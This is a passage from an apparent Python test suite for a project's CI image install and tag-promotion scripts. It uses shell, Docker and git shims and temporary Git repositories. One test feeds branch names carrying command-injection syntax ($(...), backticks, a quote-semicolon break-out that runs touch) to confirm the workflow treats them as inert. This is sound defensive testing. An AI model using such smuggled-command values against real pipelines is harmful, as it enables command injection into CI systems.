                "#!/bin/sh\n"
                "printf '%s\\n' \"$*\" >> \"${CI_TEST_DPKG_LOG:?}\"\n"
                "exit 73\n",
                encoding="utf-8",
            )
            dpkg.chmod(0o755)
            for command_name in ("apt-get", "curl", "sed"):
                command = binary_directory / command_name
                command.write_text(
                    "#!/bin/sh\n"
                    "printf '%s\\n' \"$0 $*\" >> \"${CI_TEST_FORBIDDEN_LOG:?}\"\n"
                    "exit 79\n",
                    encoding="utf-8",
                )
                command.chmod(0o755)
            base_environment = {
                "APT_SNAPSHOT": "20260825T000000Z",
                "CI_IMAGE_INPUT_MANIFEST_SHA256": manifest_sentinel,
                "CI_IMAGE_SOURCE_COMMIT": source_sentinel,
                "CI_TEST_DPKG_LOG": str(dpkg_log),
                "CI_TEST_FORBIDDEN_LOG": str(forbidden_log),
                "GH_CLI_AMD64_SHA256": "a" * 64,
                "GH_CLI_ARM64_SHA256": "b" * 64,
                "GH_CLI_VERSION": "2.98.0",
                "PATH": f"{binary_directory}:/usr/bin:/bin",
                "VENV": "/opt/venv",
            }
            invalid_shapes = (
                (source_sentinel, manifest_sentinel),
                (
                    "local-layer-solver-only-not-publishable",
                    source_sentinel,
                ),
                (
                    manifest_sentinel,
                    "local-layer-solver-only-not-publishable",
                ),
            )
            for shell in shells:
                with self.subTest(shell=str(shell)):
                    dpkg_log.unlink(missing_ok=True)
                    forbidden_log.unlink(missing_ok=True)
                    accepted = subprocess.run(
                        [str(shell), str(SCRIPTS / "ci_image_install.sh")],
                        cwd=REPO_ROOT,
                        env={**os.environ, **base_environment},
                        text=True,
                        capture_output=True,
                        check=False,
                        timeout=10,
                    )
                    self.assertEqual(accepted.returncode, 73, msg=accepted.stderr)
                    self.assertEqual(
                        dpkg_log.read_text(encoding="utf-8"),
                        "--print-architecture\n",
                    )
                    self.assertFalse(forbidden_log.exists())
                    for invalid_manifest, invalid_source in invalid_shapes:
                        with self.subTest(
                            shell=str(shell),
                            invalid_manifest=invalid_manifest,
                            invalid_source=invalid_source,
                        ):
                            dpkg_log.unlink(missing_ok=True)
                            rejected_environment = {
                                **base_environment,
                                "CI_IMAGE_INPUT_MANIFEST_SHA256": invalid_manifest,
                                "CI_IMAGE_SOURCE_COMMIT": invalid_source,
                            }
                            rejected = subprocess.run(
                                [str(shell), str(SCRIPTS / "ci_image_install.sh")],
                                cwd=REPO_ROOT,
                                env={**os.environ, **rejected_environment},
                                text=True,
                                capture_output=True,
                                check=False,
                                timeout=10,
                            )
                            self.assertNotEqual(rejected.returncode, 0)
                            self.assertFalse(dpkg_log.exists())
                            self.assertFalse(forbidden_log.exists())


class ImagePromotionContractTest(unittest.TestCase):
    """Exercise trusted same-digest tag promotion and negative event routing."""

    def test_workflow_quotes_untrusted_branch_from_environment(self) -> None:
        """Pass Git-valid hostile branch bytes as one inert promotion argument.

        Returns:
            None after the maintained folded run scalar preserves every branch
            value exactly and none of its embedded shell syntax executes.

        Raises:
            AssertionError: The workflow interpolates ``github.ref_name`` in
                shell source, omits the quoted environment boundary, changes a
                branch argument, or creates an injection marker.

        Note:
            GitHub resolves the expression into the step environment. The test
            executes the production step command with a logging promotion shim;
            hostile values are supplied only through ``subprocess`` environment
            data and are never interpolated into the test's shell source.
        """
        workflow = REPO_ROOT / ".github/workflows/ci-integration.yml"
        lines = workflow.read_text(encoding="utf-8").splitlines()
        step_marker = "      - name: Promote the tested digest without rebuilding"
        try:
            step_start = lines.index(step_marker)
        except ValueError as error:
            raise AssertionError("promotion step is missing") from error

        step_end = len(lines)
        for index in range(step_start + 1, len(lines)):
            if lines[index].startswith("      - ") or re.match(
                r"^  [A-Za-z0-9_-]+:$", lines[index]
            ):
                step_end = index
                break
        step_lines = lines[step_start:step_end]
        step_text = "\n".join(step_lines)
        self.assertIn(
            "CI_PROMOTION_BRANCH: ${{ github.ref_name }}", step_text
        )

        try:
            run_header = step_lines.index("        run: >-")
        except ValueError as error:
            raise AssertionError(
                "promotion step lacks its folded run scalar"
            ) from error
        run_lines = step_lines[run_header + 1 :]
        self.assertTrue(run_lines)
        self.assertTrue(all(line.startswith("          ") for line in run_lines))
        run_source = " ".join(line[10:] for line in run_lines)
        self.assertNotIn("github.ref_name", run_source)
        self.assertIn('--branch "$CI_PROMOTION_BRANCH"', run_source)

        trusted_replacements = {
            "${{ github.repository }}": "kevin-zf1123/photospider",
            "${{ needs.candidate-image-build.outputs.image_ref }}": (
                "ghcr.io/kevin-zf1123/photospider/photospider-ci@"
                f"{IMAGE_DIGEST}"
            ),
            "${{ needs.candidate-image-build.outputs.digest }}": IMAGE_DIGEST,
            "${{ github.sha }}": COMMIT_A,
            "${{ needs.candidate-image-build.outputs.source_commit }}": COMMIT_A,
            "${{ needs.candidate-image-build.outputs.manifest_digest }}": "4" * 64,
            "${{ needs.candidate-image-build.outputs.builder_image_version }}": (
                LINUX_ROLLOUT_VERSION
            ),
            "${{ github.event_name }}": "push",
        }
        executable_source = run_source
        for expression, fixed_value in trusted_replacements.items():
            executable_source = executable_source.replace(expression, fixed_value)
        self.assertNotIn("${{", executable_source)

        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            script_dir = root / "ci/scripts"
            script_dir.mkdir(parents=True)
            shim = script_dir / "ci_image_promote.sh"
            shim.write_text(
                "#!/usr/bin/env bash\n"
                "set -Eeuo pipefail\n"
                "printf '%s\\0' \"$@\" > \"$CI_TEST_PROMOTION_ARGV_LOG\"\n",
                encoding="utf-8",
            )
            shim.chmod(0o755)

            injection_cases = (
                (
                    "command-substitution",
                    "CI/$(touch${IFS}promotion-dollar-marker)",
                    root / "promotion-dollar-marker",
                ),
                (
                    "backtick-substitution",
                    "CI/`touch${IFS}promotion-backtick-marker`",
                    root / "promotion-backtick-marker",
                ),
                (
                    "quote-semicolon",
                    'CI/a";touch${IFS}promotion-quote-marker;echo"b',
                    root / "promotion-quote-marker",
                ),
            )
            for label, branch, marker in injection_cases:
                with self.subTest(branch_syntax=label):
                    run_command(
                        "git", "check-ref-format", f"refs/heads/{branch}"
                    )
                    argv_log = root / f"{label}.argv"
                    completed = subprocess.run(
                        ["bash", "-c", executable_source],
                        cwd=root,
                        env={
                            **os.environ,
                            "CI_IMAGE_PROMOTION_ARTIFACT_DIR": str(
                                root / f"{label}-evidence"
                            ),
                            "CI_PROMOTION_BRANCH": branch,
                            "CI_TEST_PROMOTION_ARGV_LOG": str(argv_log),
                        },
                        text=True,
                        capture_output=True,
                        check=False,
                    )
                    self.assertEqual(
                        completed.returncode,
                        0,
                        msg=(
                            f"promotion command failed for {label}:\n"
                            f"stdout:\n{completed.stdout}\n"
                            f"stderr:\n{completed.stderr}"
                        ),
                    )
                    arguments = argv_log.read_bytes().split(b"\0")
                    self.assertEqual(arguments[-1], b"")
                    arguments = arguments[:-1]
                    branch_index = arguments.index(b"--branch") + 1
                    self.assertEqual(arguments[branch_index], os.fsencode(branch))
                    self.assertFalse(marker.exists())

    def test_promotion_is_monotonic_across_live_ref_updates(self) -> None:
        """Serialize immutable/mutable writers and reject stale identities.

        Returns:
            None after real Git histories and a stateful registry shim prove
            SHA creation/reuse/conflict, registry-failure, normal, inverse,
            documentation-only, superseded, force-push, manifest-failure, and
            ref-drift outcomes.

        Raises:
            AssertionError: Production promotion changes a newer mutable tag,
                moves an existing SHA tag, mistakes registry failure for
                absence, accepts an unknown live identity, or weakens existing
                digest/tag/event validation.

        Note:
            The fixed production HTTPS remote is redirected through an isolated
            Git HOME to a temporary bare repository. Candidate scripts still
            execute unchanged and no repository-owned ref or registry is used.
        """
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            repository = root / "candidate-repository"
            origin = root / "origin.git"
            test_home = root / "home"
            scratch_root = root / "scratch"
            binary_dir = root / "bin"
            for directory in (test_home, scratch_root, binary_dir):
                directory.mkdir()

            def run_local(
                *arguments: object,
                cwd: Path = root,
                environment: dict[str, str] | None = None,
                expect_success: bool = True,
                input_text: str | None = None,
            ) -> subprocess.CompletedProcess[str]:
                """Run one isolated fixture command with an asserted outcome.

                Args:
                    *arguments: Exact argv entries.
                    cwd: Fixture-owned working directory.
                    environment: Optional environment additions.
                    expect_success: Whether zero exit status is required.
                    input_text: Optional standard-input text.

                Returns:
                    Completed process with captured text output.

                Raises:
                    AssertionError: Exit status differs from expectation.

                Note:
                    No argument is interpolated into a shell command.
                """
                completed = subprocess.run(
                    [str(argument) for argument in arguments],
                    cwd=cwd,
                    env={**os.environ, **(environment or {})},
                    input=input_text,
                    text=True,
                    capture_output=True,
                    check=False,
                )
                if expect_success and completed.returncode != 0:
                    raise AssertionError(
                        f"fixture command failed: {arguments!r}\n"
                        f"stdout:\n{completed.stdout}\n"
                        f"stderr:\n{completed.stderr}"
                    )
                if not expect_success and completed.returncode == 0:
                    raise AssertionError(
                        f"fixture command unexpectedly passed: {arguments!r}"
                    )
                return completed

            run_local("git", "init", "-b", "main", repository)
            run_local("git", "config", "user.name", "CI Promotion Test", cwd=repository)
            run_local(
                "git",
                "config",
                "user.email",
                "ci-promotion@example.invalid",
                cwd=repository,
            )
            image_lock = json.loads(
                (REPO_ROOT / "ci/locks/ci-image-lock.json").read_text(
                    encoding="utf-8"
                )
            )
            input_paths = image_lock["input_paths"]
            self.assertIsInstance(input_paths, list)
            for relative in input_paths:
                source = REPO_ROOT / relative
                destination = repository / relative
                destination.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy2(source, destination)
            run_local("git", "add", "--all", cwd=repository)
            run_local(
                "git", "commit", "-m", "fixture: image identity A", cwd=repository
            )
            commit_a = run_local(
                "git", "rev-parse", "HEAD^{commit}", cwd=repository
            ).stdout.strip()
            run_local("git", "clone", "--bare", repository, origin)
            run_local("git", "remote", "add", "origin", origin, cwd=repository)

            real_git = shutil.which("git")
            self.assertIsNotNone(real_git)
            git_environment = {
                "GIT_CONFIG_NOSYSTEM": "1",
                "HOME": str(test_home),
            }
            run_local(
                real_git,
                "config",
                "--global",
                "protocol.file.allow",
                "always",
                environment=git_environment,
            )
            builder_identity_path = root / "promotion-builder-runner.json"
            write_runner_identity(
                builder_identity_path, "Linux", LINUX_ROLLOUT_VERSION
            )
            run_local(
                real_git,
                "config",
                "--global",
                f"url.{origin.resolve().as_uri()}.insteadOf",
                "https://github.com/kevin-zf1123/photospider.git",
                environment=git_environment,
            )

            def update_remote(branch: str, commit: str) -> None:
                """Move one fixture bare-repository branch to an exact commit.

                Args:
                    branch: Git-valid branch name without ``refs/heads/``.
                    commit: Fixture commit to upload and install as the ref tip.

                Returns:
                    None after a forced local-file push succeeds.

                Raises:
                    AssertionError: The object upload or ref update fails.

                Note:
                    Only the temporary bare origin is mutated.
                """
                run_local(
                    real_git,
                    "push",
                    "--force",
                    origin,
                    f"{commit}:refs/heads/{branch}",
                    cwd=repository,
                )

            def manifest_for(commit: str, label: str) -> str:
                """Measure one fixture commit with the production manifest helper.

                Args:
                    commit: Exact fixture checkout/source commit.
                    label: Unique output basename for the canonical manifest.

                Returns:
                    Lowercase SHA-256 digest of the canonical manifest bytes.

                Raises:
                    AssertionError: Checkout, manifest creation, or digest syntax
                        validation fails.

                Note:
                    The manifest path is outside the fixture Git worktree.
                """
                run_local("git", "checkout", "--detach", commit, cwd=repository)
                manifest = root / f"{label}.manifest.json"
                digest = run_command(
                    sys.executable,
                    SCRIPTS / "ci_image_manifest.py",
                    "--repo-root",
                    repository,
                    "create",
                    "--source-commit",
                    commit,
                    "--repository",
                    "kevin-zf1123/photospider",
                    "--builder-runner-identity",
                    builder_identity_path,
                    "--output",
                    manifest,
                ).stdout.strip()
                self.assertRegex(digest, r"\A[0-9a-f]{64}\Z")
                return digest

            def create_image_input_identity(label: str) -> tuple[str, str]:
                """Create one fresh exact image-input commit and its manifest.

                Args:
                    label: Unique diagnostic suffix written into the canonical
                        ``.dockerignore`` image input and commit message.

                Returns:
                    Full commit SHA and canonical manifest digest for the new
                    fixture identity.

                Raises:
                    AssertionError: Checkout, commit, or manifest generation
                        fails through the isolated fixture helpers.

                Note:
                    Every identity branches directly from ``commit_a`` so each
                    immutable SHA destination starts absent independently. The
                    modified input is production-authoritative and therefore
                    keeps source commit, manifest source, and checkout equal.
                """
                run_local("git", "checkout", "--detach", commit_a, cwd=repository)
                dockerignore = repository / ".dockerignore"
                dockerignore.write_text(
                    dockerignore.read_text(encoding="utf-8")
                    + f"\n# immutable SHA post-create fixture: {label}\n",
                    encoding="utf-8",
                )
                run_local("git", "add", ".dockerignore", cwd=repository)
                run_local(
                    "git",
                    "commit",
                    "-m",
                    f"fixture: immutable SHA {label}",
                    cwd=repository,
                )
                commit = run_local(
                    "git", "rev-parse", "HEAD^{commit}", cwd=repository
                ).stdout.strip()
                return commit, manifest_for(commit, f"immutable-sha-{label}")

            manifest_a = manifest_for(commit_a, "identity-a")
            image_repository = "ghcr.io/kevin-zf1123/photospider/photospider-ci"
            registry_state_path = root / "registry-state.json"
            docker_log = root / "docker.log"
            inspect_log = root / "inspect.log"
            docker = binary_dir / "docker"
            docker.write_text(
                f"#!{sys.executable}\n"
                "import json\n"
                "import os\n"
                "from pathlib import Path\n"
                "import shlex\n"
                "import sys\n"
                "arguments = sys.argv[1:]\n"
                "log = Path(os.environ['CI_TEST_DOCKER_LOG'])\n"
                "with log.open('a', encoding='utf-8') as handle:\n"
                "    handle.write(' '.join(shlex.quote(value) for value in arguments) + '\\n')\n"
                "state_path = Path(os.environ['CI_TEST_REGISTRY_STATE'])\n"
                "state = (\n"
                "    json.loads(state_path.read_text(encoding='utf-8'))\n"
                "    if state_path.exists() else {}\n"
                ")\n"
                "if arguments[:3] == ['buildx', 'imagetools', 'create']:\n"
                "    tags = []\n"
                "    metadata = None\n"
                "    index = 3\n"
                "    while index < len(arguments) - 1:\n"
                "        if arguments[index] == '--tag':\n"
                "            tags.append(arguments[index + 1]); index += 2\n"
                "        elif arguments[index] == '--metadata-file':\n"
                "            metadata = Path(arguments[index + 1]); index += 2\n"
                "        else:\n"
                "            index += 1\n"
                "    source_digest = arguments[-1].rsplit('@', 1)[-1]\n"
                "    for tag in tags:\n"
                "        state[tag] = source_digest\n"
                "    state_path.write_text(\n"
                "        json.dumps(state, sort_keys=True) + '\\n', encoding='utf-8'\n"
                "    )\n"
                "    if metadata is None:\n"
                "        raise SystemExit(95)\n"
                "    metadata.parent.mkdir(parents=True, exist_ok=True)\n"
                "    metadata_digest = os.environ.get('CI_TEST_METADATA_DIGEST', source_digest)\n"
                "    metadata.write_text(\n"
                "        json.dumps(\n"
                "            {'containerimage.descriptor': {'digest': metadata_digest}}\n"
                "        ) + '\\n',\n"
                "        encoding='utf-8',\n"
                "    )\n"
                "elif arguments[:3] == ['buildx', 'imagetools', 'inspect']:\n"
                "    target = arguments[-1]\n"
                "    with Path(os.environ['CI_TEST_INSPECT_LOG']).open(\n"
                "        'a', encoding='utf-8'\n"
                "    ) as handle:\n"
                "        handle.write(target + '\\n')\n"
                "    mode = 'expected'\n"
                "    selected = os.environ.get('CI_TEST_INSPECT_TARGET')\n"
                "    sequence_text = os.environ.get('CI_TEST_INSPECT_SEQUENCE', '')\n"
                "    if sequence_text and not selected:\n"
                "        raise SystemExit(92)\n"
                "    if sequence_text and selected == target:\n"
                "        sequence = json.loads(sequence_text)\n"
                "        if (not isinstance(sequence, list) or not sequence or\n"
                "                not all(isinstance(item, str) and item for item in sequence)):\n"
                "            raise SystemExit(93)\n"
                "        sequence_state_path = Path(\n"
                "            os.environ['CI_TEST_INSPECT_SEQUENCE_STATE']\n"
                "        )\n"
                "        sequence_state = (\n"
                "            json.loads(sequence_state_path.read_text(encoding='utf-8'))\n"
                "            if sequence_state_path.exists() else {}\n"
                "        )\n"
                "        sequence_index = sequence_state.get(target, 0)\n"
                "        if (not isinstance(sequence_index, int) or\n"
                "                isinstance(sequence_index, bool) or\n"
                "                sequence_index < 0 or sequence_index >= len(sequence)):\n"
                "            raise SystemExit(94)\n"
                "        mode = sequence[sequence_index]\n"
                "        sequence_state[target] = sequence_index + 1\n"
                "        sequence_state_path.write_text(\n"
                "            json.dumps(sequence_state, sort_keys=True) + '\\n',\n"
                "            encoding='utf-8',\n"
                "        )\n"
                "    elif not selected or selected == target:\n"
                "        mode = os.environ.get('CI_TEST_INSPECT_MODE', 'expected')\n"
                "    expected = state.get(target)\n"
                "    wrong = os.environ['CI_TEST_WRONG_DIGEST']\n"
                "    if mode == 'expected' and expected:\n"
                "        print(json.dumps({'digest': expected}, separators=(',', ':')))\n"
                "    elif mode == 'wrong':\n"
                "        print(json.dumps({'digest': wrong}, separators=(',', ':')))\n"
                "    elif mode == 'no-digest':\n"
                "        print('{}')\n"
                "    elif mode == 'multiple':\n"
                "        first = expected or wrong\n"
                "        print(f'{{\"digest\":\"{first}\",\"digest\":\"{wrong}\"}}')\n"
                "    elif mode in {'expected', 'missing'}:\n"
                "        print(f'ERROR: {target}: not found', file=sys.stderr)\n"
                "        raise SystemExit(1)\n"
                "    elif mode == 'auth':\n"
                "        print('ERROR: denied: requested access to the resource is denied', file=sys.stderr)\n"
                "        raise SystemExit(1)\n"
                "    elif mode == 'network':\n"
                "        print('ERROR: failed to do request: TLS handshake timeout', file=sys.stderr)\n"
                "        raise SystemExit(1)\n"
                "    elif mode == 'not-found-drift':\n"
                "        print(f'ERROR: {target}: not found (registry detail)', file=sys.stderr)\n"
                "        raise SystemExit(1)\n"
                "    elif mode == 'unknown':\n"
                "        print('ERROR: unclassified registry failure', file=sys.stderr)\n"
                "        raise SystemExit(42)\n"
                "    else:\n"
                "        raise SystemExit(96)\n"
                "else:\n"
                "    raise SystemExit(97)\n",
                encoding="utf-8",
            )
            docker.chmod(0o755)

            git_wrapper = binary_dir / "git"
            git_wrapper.write_text(
                "#!/usr/bin/env bash\n"
                "set -Eeuo pipefail\n"
                "is_fetch=false\n"
                "for argument in \"$@\"; do\n"
                "  if [[ \"$argument\" == fetch ]]; then is_fetch=true; fi\n"
                "done\n"
                "\"$CI_TEST_REAL_GIT\" \"$@\"\n"
                "if [[ \"$is_fetch\" == true && -n ${CI_TEST_GIT_DRIFT_REF:-} ]]; then\n"
                "  count=0\n"
                "  if [[ -f \"$CI_TEST_GIT_DRIFT_COUNTER\" ]]; then\n"
                "    read -r count < \"$CI_TEST_GIT_DRIFT_COUNTER\"\n"
                "  fi\n"
                "  count=$((count + 1))\n"
                "  printf '%s\\n' \"$count\" > \"$CI_TEST_GIT_DRIFT_COUNTER\"\n"
                "  if ((count == 1)); then\n"
                "    \"$CI_TEST_REAL_GIT\" \\\n"
                "      --git-dir=\"$CI_TEST_GIT_DRIFT_REPOSITORY\" \\\n"
                "      update-ref \"$CI_TEST_GIT_DRIFT_REF\" \\\n"
                "      \"$CI_TEST_GIT_DRIFT_NEXT\"\n"
                "  fi\n"
                "fi\n",
                encoding="utf-8",
            )
            git_wrapper.chmod(0o755)

            base_environment = {
                **git_environment,
                "PATH": f"{binary_dir}:{os.environ['PATH']}",
                "CI_IMAGE_PROMOTION_REPO_ROOT": str(repository),
                "CI_IMAGE_PROMOTION_SCRATCH_ROOT": str(scratch_root),
                "CI_TEST_DOCKER_LOG": str(docker_log),
                "CI_TEST_INSPECT_LOG": str(inspect_log),
                "CI_TEST_REAL_GIT": str(real_git),
                "CI_TEST_REGISTRY_STATE": str(registry_state_path),
                "CI_TEST_WRONG_DIGEST": "sha256:" + "9" * 64,
            }

            def invoke(
                branch: str,
                label: str,
                *,
                candidate_commit: str = commit_a,
                source_commit: str | None = None,
                manifest_digest: str = manifest_a,
                image_digest: str = IMAGE_DIGEST,
                event_name: str = "push",
                expect_success: bool = True,
                environment_overrides: dict[str, str] | None = None,
            ) -> tuple[
                subprocess.CompletedProcess[str],
                dict[str, str] | None,
                str,
                list[str],
            ]:
                """Run production promotion against live fixture Git/OCI state.

                Args:
                    branch: Exact live branch identity.
                    label: Unique filesystem-safe evidence label.
                    candidate_commit: Tested product and checkout commit.
                    source_commit: Image source commit, defaulting to candidate.
                    manifest_digest: Candidate canonical input-manifest digest.
                    image_digest: Exact tested OCI digest.
                    event_name: Protected trigger identity.
                    expect_success: Whether production must return zero.
                    environment_overrides: Optional registry/ref fault controls.

                Returns:
                    Process, success-only outputs, Docker call log, and ordered
                    inspect destination list.

                Raises:
                    AssertionError: Checkout or process outcome is incoherent,
                        a failed run reports a promoted/superseded success, or a
                        successful output record is malformed.

                Note:
                    Each call owns fresh evidence while registry state persists,
                    allowing deterministic monotonic-tag assertions. Its unique
                    sequence-state file lets separate Docker shim processes
                    return distinct responses for repeated inspection of the
                    same destination within one promotion invocation.
                """
                run_local(
                    "git", "checkout", "--detach", candidate_commit, cwd=repository
                )
                docker_log.write_text("", encoding="utf-8")
                inspect_log.write_text("", encoding="utf-8")
                output = root / f"{label}.outputs"
                sequence_state = root / f"{label}.inspect-sequence.json"
                actual_source = source_commit or candidate_commit
                image = f"{image_repository}@{image_digest}"
                completed = run_command(
                    "bash",
                    SCRIPTS / "ci_image_promote.sh",
                    "--repository",
                    "kevin-zf1123/photospider",
                    "--image-ref",
                    image,
                    "--expected-digest",
                    image_digest,
                    "--candidate-commit",
                    candidate_commit,
                    "--source-commit",
                    actual_source,
                    "--manifest-digest",
                    manifest_digest,
                    "--builder-image-version",
                    LINUX_ROLLOUT_VERSION,
                    "--event-name",
                    event_name,
                    "--branch",
                    branch,
                    environment={
                        **base_environment,
                        "CI_TEST_METADATA_DIGEST": image_digest,
                        **(environment_overrides or {}),
                        "CI_TEST_INSPECT_SEQUENCE_STATE": str(sequence_state),
                        "CI_IMAGE_PROMOTION_ARTIFACT_DIR": str(
                            root / f"{label}-evidence"
                        ),
                        "CI_IMAGE_PROMOTION_OUTPUT_FILE": str(output),
                    },
                    expect_success=expect_success,
                )
                inspected = inspect_log.read_text(encoding="utf-8").splitlines()
                docker_calls = docker_log.read_text(encoding="utf-8")
                if not expect_success:
                    output_text = (
                        output.read_text(encoding="utf-8")
                        if output.exists()
                        else ""
                    )
                    self.assertNotRegex(
                        output_text, r"(?m)^status=(?:promoted|superseded)$"
                    )
                    self.assertNotRegex(
                        completed.stdout,
                        r"(?m)^(?:Promoted |Candidate .* was superseded;)",
                    )
                    return completed, None, docker_calls, inspected
                values: dict[str, str] = {}
                for line in output.read_text(encoding="utf-8").splitlines():
                    key, separator, value = line.partition("=")
                    if not separator or not key or not value or key in values:
                        raise AssertionError(
                            f"malformed promotion output for {label}: {line!r}"
                        )
                    values[key] = value
                self.assertEqual(
                    set(values),
                    {"branch_tag", "digest", "sha_action", "sha_tag", "status"},
                )
                return completed, values, docker_calls, inspected

            def registry_state() -> dict[str, str]:
                """Return the stateful shim's exact current tag-to-digest map.

                Returns:
                    Empty state before first mutation, otherwise the decoded
                    destination-to-digest string mapping.

                Raises:
                    AssertionError: Persisted state is not a JSON object.

                Note:
                    The caller performs exact per-tag digest assertions.
                """
                if not registry_state_path.exists():
                    return {}
                value = json.loads(registry_state_path.read_text(encoding="utf-8"))
                self.assertIsInstance(value, dict)
                return value

            def created_tag_groups(docker_calls: str) -> list[list[str]]:
                """Decode every stateful Buildx create call's exact tag group.

                Args:
                    docker_calls: Newline-delimited, shell-quoted argv log from
                        one production promotion invocation.

                Returns:
                    Ordered destination groups, one list per create operation.

                Raises:
                    AssertionError: A create call has a missing tag value or
                        contains no destination.

                Note:
                    Parsing the shim's argv log makes the regression sensitive
                    to removal or reordering of the immutable SHA preflight; a
                    same-SHA rerun must contain no SHA destination in any group.
                """
                groups: list[list[str]] = []
                for line in docker_calls.splitlines():
                    arguments = shlex.split(line)
                    if arguments[:3] != ["buildx", "imagetools", "create"]:
                        continue
                    tags: list[str] = []
                    for index, argument in enumerate(arguments[:-1]):
                        if argument == "--tag":
                            self.assertLess(index + 1, len(arguments))
                            tags.append(arguments[index + 1])
                    self.assertTrue(tags)
                    groups.append(tags)
                return groups

            branch_destination = f"{image_repository}:branch-main"
            latest_destination = f"{image_repository}:latest"
            mutable_sentinels = {
                branch_destination: "sha256:" + "b" * 64,
                latest_destination: "sha256:" + "c" * 64,
            }
            registry_state_path.write_text(
                json.dumps(mutable_sentinels, sort_keys=True) + "\n",
                encoding="utf-8",
            )
            immutable_creation_failures = (
                (
                    "metadata-mismatch",
                    None,
                    {
                        "CI_TEST_METADATA_DIGEST": base_environment[
                            "CI_TEST_WRONG_DIGEST"
                        ]
                    },
                    "Immutable SHA creation metadata differs",
                    1,
                ),
                (
                    "post-create-wrong-digest",
                    ("missing", "wrong"),
                    {},
                    "New immutable SHA tag differs from the tested digest",
                    2,
                ),
                (
                    "post-create-missing-digest",
                    ("missing", "no-digest"),
                    {},
                    "inspected manifest lacks one canonical top-level digest",
                    2,
                ),
                (
                    "post-create-multiple-digests",
                    ("missing", "multiple"),
                    {},
                    "duplicate JSON member: digest",
                    2,
                ),
            )
            for (
                label,
                inspect_sequence,
                environment_overrides,
                diagnostic,
                expected_inspect_count,
            ) in immutable_creation_failures:
                with self.subTest(immutable_sha_creation=label):
                    candidate_commit, candidate_manifest = (
                        create_image_input_identity(label)
                    )
                    update_remote("main", candidate_commit)
                    sha_destination = (
                        f"{image_repository}:sha-{candidate_commit}"
                    )
                    invocation_environment = dict(environment_overrides)
                    if inspect_sequence is not None:
                        invocation_environment.update(
                            {
                                "CI_TEST_INSPECT_SEQUENCE": json.dumps(
                                    inspect_sequence
                                ),
                                "CI_TEST_INSPECT_TARGET": sha_destination,
                            }
                        )
                    state_before = registry_state()
                    failed, _, calls, inspected = invoke(
                        "main",
                        label,
                        candidate_commit=candidate_commit,
                        manifest_digest=candidate_manifest,
                        environment_overrides=invocation_environment,
                        expect_success=False,
                    )
                    self.assertIn(diagnostic, failed.stderr)
                    self.assertEqual(
                        inspected, [sha_destination] * expected_inspect_count
                    )
                    self.assertEqual(
                        created_tag_groups(calls), [[sha_destination]]
                    )
                    state_after = registry_state()
                    self.assertEqual(state_after[sha_destination], IMAGE_DIGEST)
                    self.assertEqual(
                        set(state_after).difference(state_before),
                        {sha_destination},
                    )
                    for mutable_destination in (
                        branch_destination,
                        latest_destination,
                    ):
                        self.assertEqual(
                            state_after[mutable_destination],
                            state_before[mutable_destination],
                        )

            update_remote("main", commit_a)

            long_branch = "CI/" + "/".join(
                f"segment{index}-" + "x" * 52 for index in range(4)
            )
            valid_cases = (
                ("main", "main"),
                ("CI/a-b", "ci-flat"),
                ("CI/a/b", "ci-nested"),
                ("CI/a+b", "ci-plus"),
                ("CI/a@b", "ci-at"),
                ("CI/a=b", "ci-equals"),
                ("CI/a,b", "ci-comma"),
                ("CI/a;z", "ci-semicolon"),
                ("CI/中文", "ci-unicode"),
                (long_branch, "ci-long"),
            )
            for branch, _ in valid_cases:
                update_remote(branch, commit_a)

            successful: dict[
                str, tuple[dict[str, str], str, list[str]]
            ] = {}
            for branch, label in valid_cases:
                if branch != "main":
                    run_command("git", "check-ref-format", f"refs/heads/{branch}")
                _, outputs, calls, inspected = invoke(branch, label)
                if outputs is None:
                    raise AssertionError(f"successful promotion lacks output: {label}")
                self.assertEqual(outputs["status"], "promoted")
                successful[label] = (outputs, calls, inspected)

            _, repeated_outputs, repeated_calls, repeated_inspected = invoke(
                "CI/a-b", "ci-flat-repeat"
            )
            if repeated_outputs is None:
                raise AssertionError("repeated promotion lacks output")
            main_outputs, main_calls, _ = successful["main"]
            flat_outputs, _, _ = successful["ci-flat"]
            nested_outputs, _, _ = successful["ci-nested"]
            long_outputs, _, _ = successful["ci-long"]
            self.assertEqual(main_outputs["branch_tag"], "branch-main")
            self.assertEqual(main_outputs["sha_tag"], f"sha-{commit_a}")
            self.assertEqual(main_outputs["sha_action"], "created")
            self.assertEqual(repeated_outputs["sha_action"], "reused")
            self.assertIn("photospider-ci:latest", main_calls)
            self.assertNotEqual(
                flat_outputs["branch_tag"], nested_outputs["branch_tag"]
            )
            self.assertEqual(
                flat_outputs["branch_tag"], repeated_outputs["branch_tag"]
            )
            for branch, label in valid_cases:
                outputs, calls, inspected = successful[label]
                branch_tag = outputs["branch_tag"]
                self.assertRegex(
                    branch_tag, r"\A[A-Za-z0-9_][A-Za-z0-9_.-]{0,127}\Z"
                )
                self.assertLessEqual(len(branch_tag), 128)
                self.assertEqual(outputs["digest"], IMAGE_DIGEST)
                self.assertEqual(outputs["sha_tag"], f"sha-{commit_a}")
                sha_destination = f"{image_repository}:sha-{commit_a}"
                branch_destination = f"{image_repository}:{branch_tag}"
                if branch == "main":
                    expected_inspections = [
                        sha_destination,
                        sha_destination,
                        branch_destination,
                        f"{image_repository}:latest",
                    ]
                    expected_create_groups = [
                        [sha_destination],
                        [branch_destination, f"{image_repository}:latest"],
                    ]
                    self.assertEqual(outputs["sha_action"], "created")
                else:
                    expected_inspections = [sha_destination, branch_destination]
                    expected_create_groups = [[branch_destination]]
                    self.assertEqual(outputs["sha_action"], "reused")
                self.assertEqual(inspected, expected_inspections)
                self.assertEqual(
                    calls.count("buildx imagetools inspect"),
                    len(expected_inspections),
                )
                self.assertEqual(created_tag_groups(calls), expected_create_groups)
                self.assertIn("--prefer-index=false", calls)
                self.assertIn(f"{image_repository}@{IMAGE_DIGEST}", calls)
                self.assertNotIn(" build ", calls)
                if branch == "main":
                    self.assertIn("photospider-ci:latest", calls)
                else:
                    expected_hash = hashlib.sha256(os.fsencode(branch)).hexdigest()
                    self.assertTrue(branch_tag.endswith(f"-{expected_hash}"))
                    self.assertNotIn("photospider-ci:latest", calls)
            self.assertTrue(flat_outputs["branch_tag"].startswith("branch-CI-a-b-"))
            self.assertTrue(nested_outputs["branch_tag"].startswith("branch-CI-a-b-"))
            self.assertLessEqual(len(long_outputs["branch_tag"]), 128)
            self.assertEqual(repeated_inspected, successful["ci-flat"][2])
            self.assertEqual(
